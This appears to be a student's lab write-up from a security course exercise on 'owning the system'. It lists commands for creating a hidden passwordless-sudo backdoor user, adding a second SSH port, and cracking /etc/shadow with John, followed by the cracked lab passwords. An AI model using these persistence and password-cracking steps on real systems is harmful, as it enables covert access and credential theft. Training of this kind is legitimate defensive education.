Advanced Bash - Owning the System
Step 1: Shadow People
1. Create a secret user named sysd. Make sure this user doesn't have a home folder created:

   * “useradd sysd” (# adduser will create a home folder and profile) 
   2. Give your secret user a password:

      * “passwd sysd” (# sysdpassw0rd)
      3. Give your secret user a system UID < 1000:

         * “usermod -u 523 sysd”
         4. Give your secret user the same GID:

            * “groupmod -g 523 sysd” 
            5. Give your secret user full sudo access without the need for a password:

               * “sysd        ALL=(ALL:ALL) NOPASSWD:ALL”
               6. Test that sudo access works without your password:

 “sudo -l”

Step 2: Smooth Sailing
                  1. Edit the sshd_config file:

“nano /etc/ssh/sshd_config” add “Port 2222” below port 22 and unhash them

Step 3: Testing Your Configuration Update
                     1. Restart the SSH service:

                        * “service ssh restart”
                        2. Exit the root account:

                           * “exit” 
                           3. SSH to the target machine using your sysd account and port 2222:

                              * “ssh sysd@192.168.6.105 -p 2222”
                              4. Use sudo to switch to the root user:

                                 * “sudo su ”
Step 4: Crack All the Passwords
                                 1. SSH back to the system using your sysd account and port 2222:

                                    * “ssh sysd@192.168.6.105 -p 2222”
                                    2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:

                                       * “”sudo su” and then “john /etc/shadow”
                                       1. Results:
                                       1. computer (stallman)
                                       2. freedom (babbage)
                                       3. trustno1 (mitnik)
                                       4. dragon (lovelace)
                                       5. lakers (turing)
                                       6. passw0rd (sysadmin)
                                       7. goodluck! (student)
                                       8. 8th password hash would not load, even after an hour :(
